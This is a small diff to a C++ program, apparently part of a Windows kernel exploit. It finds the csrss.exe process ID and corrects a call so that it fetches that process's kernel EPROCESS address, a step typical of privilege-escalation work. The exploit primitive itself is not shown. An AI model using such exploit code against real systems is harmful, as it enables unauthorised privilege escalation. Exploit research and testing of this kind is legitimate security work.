@@ -43,8 +43,8 @@ int main() {
     int csrssProcessId = exploit.ProcessId("csrss.exe", 1);
     printf("[+] csrss ProcessId: %d\n", csrssProcessId);
 
-    __int64 csrssEProcess = exploit.EProcess(GetCurrentProcessId());
+    __int64 csrssEProcess = exploit.EProcess(csrssProcessId);
     printf("[+] csrss EProcess: %llx\n", csrssEProcess);
-
+     
     Sleep(-1);
 }
